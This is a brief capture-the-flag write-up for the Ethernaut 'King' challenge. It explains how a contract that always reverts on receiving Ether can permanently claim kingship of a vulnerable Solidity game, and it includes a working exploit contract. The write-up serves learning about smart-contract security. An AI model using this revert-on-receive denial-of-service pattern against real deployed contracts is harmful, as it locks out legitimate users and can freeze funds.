#KING

##Objective : 
whoever sends an amount of ether that is larger than the current prize becomes the new king. so prevent the level from reclaiming the kingship when the instance is submitted.

##analysis: 
in order to satisy the require condition in receive function, we need to send at least 0.001 ether.
solution :
once we become the new king, other users can not do so.
their call to the receive() function should fail. 
since we can control the address of the contract to which the funds will be sent , it is possible via the tranfer function .

dont implement any of fallback() or recieve () while doing ether transfer
the contract will not be able to receive any Ether, the transfer call  reverts, reverting the whole transaction as such.

##exploit:
```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface King {
    function prize() external view returns (uint);
}
contract Newking {
    King Hack = King(<addr>);

    constructor() public payable {
        address(Hack).call{value: Hack.prize()}("");
    }
    receive() external payable {
        revert("nil");
    }
}

```
